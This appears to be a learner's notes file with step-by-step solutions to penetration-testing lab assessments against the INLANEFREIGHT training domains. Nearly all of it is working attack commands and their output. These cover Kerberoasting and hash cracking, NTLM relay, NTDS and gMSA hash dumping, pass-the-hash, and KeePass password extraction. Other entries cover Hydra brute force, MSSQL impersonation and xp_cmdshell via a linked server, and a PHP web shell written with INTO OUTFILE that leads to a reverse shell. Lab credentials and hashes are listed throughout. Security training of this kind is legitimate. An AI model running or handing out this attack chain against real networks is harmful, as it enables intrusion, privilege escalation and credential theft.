# Skill Assessments

TODOS:
- Footprinting
- Pivoting, Tunneling, and Port Forwarding
- AD
- AD Bloodhound

*Command*: 

*Result:* 

## Crackmapexec
*Command*: Find all internal ips and domain names
- proxychains4 -q cme smb -M ioxidresolver

*Result*:
|       IP       |        Domain Name        | Notes |
| :------------: | :-----------------------: | :---: |
|  172.16.15.3   | dc01.INLANEFREIGHT.LOCAL  |       |
|  172.16.15.15  | ql01.INLANEFREIGHT.LOCAL  |       |
|  172.16.15.20  | dev01.INLANEFREIGHT.LOCAL |       |
| 10.129.246.181 | sql01.INLANEFREIGHT.LOCAL |       |

---

*Command*: RIDs bruteforce
- proxychains4 -q cme smb --rid-brute 10000

*Result:* Juliette

---

*Command*: Kerberosasting anonymous
- proxychains4 cme ldap --kerberoasting kerberoasting.out

*Result:* 
- Juliette:hash

---

*Command*: Crack Juliettes password
- hashcat -m 18200 hash.juliette

*Result:* juliettes:Password1

---

*Command*: User discovery with juliettes user
- cmd ldap -M user-desc

*Result:* Atul:hooters1

---

*Command*: Execution ov xp_dirtree inside mssql
- Responder
- cme mssql - xp_dirtree
  
*Result:* SQL01$::INLANEFREIGHT:hash

---

*Command*: Extrackt all text file from smb
-  proxychains4 smbmap -H 172.16.15.15 -u Atul -p 'hooters1' -r -A txt
  
*Result:* SQL01$::INLANEFREIGHT:hash
- file 172.16.15.3-DEV_sql_dev_creds.txt  
- sqldev:Sq!D3vUs3R
  
--- 

*Command*: priv escalation with mssql
- proxychains4 -q crackmapexec mssql 172.16.15.15 -u 'sqldev' -p 'Sq!D3vUs3R' --local-auth -M mssql_priv
- proxychains4 -q crackmapexec mssql 172.16.15.15 -u 'sqldev' -p 'Sq!D3vUs3R' --local-auth -M mssql_priv -o ACTIO
N=privesc

*Result:* 
- [+] sqldev can impersonate netdb (sysadmin)
- [+] sqldev is now a sysadmin! (Pwn3d!)
  
--- 

*Command*: Execute commands with the new user
- proxychains4 -q crackmapexec mssql 172.16.15.15 -u 'sqldev' -p 'Sq!D3vUs3R' --local-auth -x 'type C:\Users\Public\flag.txt'

 *Result:* Flag
 
--- 

*Command*: Read database interns
-  proxychains4 -q crackmapexec mssql 172.16.15.15 -u 'sqldev' -p 'Sq!D3vUs3R' --local-auth -q "SELECT * FROM interns.dbo.details" > details.txt

*Result:*  intern30:Welcome1
  
--- 

*Command*: Find writable share
- cme 172.16.15.15 smb --shares 
 
*Result:* DEV_INTERN - WRITE/READ

--- 

*Command*: Steal hash with drop-sc module
- cme smb 172.16.15.12 -M drop-sc
- sudo ntlmrelayx -tf relax.txt -smb2support --no-http
- sudo responder -I tun0

*Result:* 
- JAMES:hash:04apple
---

*Command*: ldap scan to DC01
- cme ldap 172.16.15.3 -u james -p '04pple' -gmsa
  
*Result:* Account: svc_devadm$    NTLM: a995d569117ec719c2402c966867569a

---

*Command*: Get 3rd flag
-  proxychains4 -q crackmapexec smb 172.16.15.20 -u 'svc_devadm$' -H a995d569117ec719c2402c966867569a -x 'type C:\Users\Administrator\Desktop\flag.txt'

*Result:* 3rd flag + found keepass file 

---

*Command*: Trigger keepass module to extract master password
-  cme smb 172.16.15.20 -u 'svc_devadm$' -H hash -M keepass_discover
-  cme smb 172.16.15.20 -u 'svc_devadm$' -H hash -M keepass_trigger -o ACTION=ADD KEEPASS_CONFIG_PATH='C:/Users/Administrator/AppData/Roaming/KeePass/KeePass.config.xml'
- cme  smb 172.16.15.20 -u 'svc_devadm$' -H hash -M keepass_trigger -o ACTION=POLL


*Result:* Found files + trigger added + exportted file create 

---

*Command*: Read /tmp/export.xml file

*Result:* Found user nick + password

---

*Command*: Extract files from shares Ccache 
- cme smb 172.16.15.3 -M spider_plus -o READ_ONLY=false

*Result:* read 4th flag + found svc_inlane.ccache + new user svc_inlaneadm

---

*Command*: change name of ccache file + create 
- mv big_file_name.ccaches svc_inlanaeadm.ccaches
- export KRB5CCNAME=/home/kalilearn/git/hacklab/academy/cme/svc_inlaneadm.ccaches

*Result:* ccache file without special characters

---

*Command*: Dump hashes with ntds
- cme smb 172.16.15.3 --use-kcache --ntds

*Result:* Found administrator hash

---

*Command*: Read flag
cme smb 172.16.15.3 -u Administrator -H 935f8a2f4fc9ec7b45c54a1044c74c08 -x 'type C:\Users\Administrator\Desktop\flag.txt'

*Result:* Flag

---

### Credentials Found
|   Username    |      Password      |            Note            |
| :-----------: | :----------------: | :------------------------: |
|   Juliette    |     Password1      |          1st flag          |
|     Atul      |      hooters1      |          kerbast           |
|    sqldev     |     Sq!D3vUs3R     | pwnd, priv esc, from share |
|   intern30    |      Welcome1      |         from mssql         |
|     james     |      04apple       |         -M drop-sc         |
|  svc_devadm$  |        hash        |  pwnd, from james, --gmsa  |
|     nick      | ASU934as0-dm23asd! |        from keepass        |
| svc_inlaneadm |    ccache file     |      admin privileges      |
| Administrator |        hash        |        using ccache        |

## Common Services
### Assessment 1
*Command:* smtp-user-enum -M RCPT -U users.list -t $TARGET -D inlanefreight.htb -p 587

*Result*: 10.129.95.172: **fiona@inlanefreight.htb** exists

---

*Command:* hydra -l 'fiona@inlanefreight.htb' -P /usr/share/wordlists/rockyou.txt -f $TARGET smtp -v -I

*Result*: login: fiona@inlanefreight.htb   password: 987654321
fiona:987654321

---

*Command:* 
1. mysql -h $TARGET -u fiona -p'987654321'
2. select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php';
3. http://10.129.203.7/back.php?c=whoami
4. Start listener
5. http://10.129.203.7/back.php?c=powershell [enconded shell from here](https://www.revshells.com/)

### Assessment 2
*Command:* ./subbrute.py inlanefreight.htb -s names.txt -r resolvers.txt
*Result*: app.inlanefreight.htb

---

*Command:* dig AXFR @app.inlanefreight.htb inlanefreight.htb
*Result*: 

|           Domain           |   IP Address   |
| :------------------------: | :------------: |
|   app.inlanefreight.htb.   |  10.129.200.5  |
|   dc1.inlanefreight.htb.   | 10.129.100.10  |
|   dc2.inlanefreight.htb.   | 10.129.200.10  |
| int-ftp.inlanefreight.htb. |   127.0.0.1    |
| int-nfs.inlanefreight.htb. | 10.129.200.70  |
|   ns.inlanefreight.htb.    |   127.0.0.1    |
|   un.inlanefreight.htb.    | 10.129.200.142 |
|   ws1.inlanefreight.htb.   | 10.129.200.101 |
|   ws2.inlanefreight.htb.   | 10.129.200.102 |
|  wsus.inlanefreight.htb.   | 10.129.200.80  |

---

*Command:*
nmap -p-
**rustscan -a 10.129.38.94 -r 1-65535**

*Result:*

|     PORT      |  STATE   |   SERVICE   |
| :-----------: | :------: | :---------: |
|    22/tcp     |   open   |     ssh     |
|    53/tcp     |   open   |   domain    |
|    110/tcp    |   open   |    pop3     |
|    995/tcp    |   open   |    pop3s    |
|   2121/tcp    |   open   | ccproxy-ftp |
| **30021/tcp** | **open** | **unknown** |

---

*Command:* ftp $TARGET 30021

*Result:* get simon/mynotes.txt => wordlist, maybe passwords

---

*Command:* 
hydra -l simon -P mynotes.txt 10.129.38.94 ssh -v -I
   
*Result*: simon:8Ns8j1b!23hs4921smHzwn

### Assessment 3
*Command:* rustscan -a 10.129.203.10 -r 1-65535

*Result:* 135,445

---

*Command:* smb -L //TARGET/home

*Result:*  simon:random.txt

---

*Command:* crackmapexec smb 10.129.203.10 -u assusers.txt -p asspass.txt

*Result:* fiona:48Ns72!bns74@S84NNNSl

---

*Command:* hydra -L assuser.txt -P asspass.txt 10.129.203.10 rdp -v -I

*Result:* login: fiona   password: 48Ns72!bns74@S84NNNSl

---

*Command:* rdesktop 10.129.203.10 -u fiona -p '48Ns72!bns74@S84NNNSl'

*Result:* Conect to RDP

---

*Command:* Check who can I impersonate
1. SELECT distinct b.name
2. FROM sys.server_permissions a
3. INNER JOIN sys.server_principals b
4. ON a.grantor_principal_id = b.principal_id
5. WHERE a.permission_name = 'IMPERSONATE'
6. GO

*Result:*  John

---

*Command:* Impersonate JOHN
1. EXECUTE AS LOGIN = 'john'
2. SELECT SYSTEM_USER
3. SELECT IS_SRVROLEMEMBER('sysadmin')
4. GO

*Result:* Now I am John

---

*Command:* Identify linked servers: SELECT srvname, isremote FROM sysservers 

*Result:* LOCAL.TEST.LINKED.SRV

---

*Command:* conected to linked server: EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]

*Result:* testadmin

---

*Command:* Enable xp_cmdshell
1. EXECUTE("EXECUTE sp_configure 'show advanced options', 1") AT [LOCAL.TEST.LINKED.SRV]
2. EXECUTE("RECONFIGURE") AT [LOCAL.TEST.LINKED.SRV]
3. EXECUTE("EXECUTE sp_configure 'xp_cmdshell', 1") AT [LOCAL.TEST.LINKED.SRV]
4. EXECUTE("xp_cmdshell 'whoami'") AT [LOCAL.TEST.LINKED.SRV]

*Result:* nt authority\system

---

*Command:* Read admin flag
1. EXECUTE("xp_cmdshell 'dir C:\Users\Administrator\Desktop'") AT [LOCAL.TEST.LINKED.SRV]
2. EXECUTE("xp_cmdshell 'type C:\Users\Administrator\Desktop\flag.txt'") AT [LOCAL.TEST.LINKED.SRV]

*Result:* Flag